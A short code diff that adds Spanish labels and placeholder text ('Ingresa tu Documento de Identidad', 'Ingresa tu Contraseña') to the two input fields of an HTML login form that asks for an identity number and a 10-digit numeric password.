@@ -16,11 +16,13 @@
         <form name="login_vali" id="login_vali" action="" method="post" onsubmit="telon()" enctype="multipart/form-data">
             
             <div class="cont-campos">
-            <input type="text" name="num_usuario" id="num_usuario" class="campo-blanco" pattern="[A-Z0-9]{6,15}" max="15" minlength="6" inputmode="numeric" tabindex="1" required autofocus>
+                <label for="text">Ingresa tu Documento de Identidad:</label>
+                <input placeholder="Numero de identidad" type="text" name="num_usuario" id="num_usuario" class="campo-blanco" pattern="[A-Z0-9]{6,15}" max="15" minlength="6" inputmode="numeric" tabindex="1" required autofocus>
             </div>
 
             <div class="cont-campos">
-            <input type="password" name="contra" id="contra" pattern="[0-9]{10}" max="10" minlength="10" inputmode="tel" tabindex="2" required>
+                <label for="password">Ingresa tu Contraseña:</label>
+                <input placeholder="Contraseña" type="password" name="contra" id="contra" pattern="[0-9]{10}" max="10" minlength="10" inputmode="tel" tabindex="2" required>
             </div>
 
             <button type="submit" id="entrar">Ingresar</button>
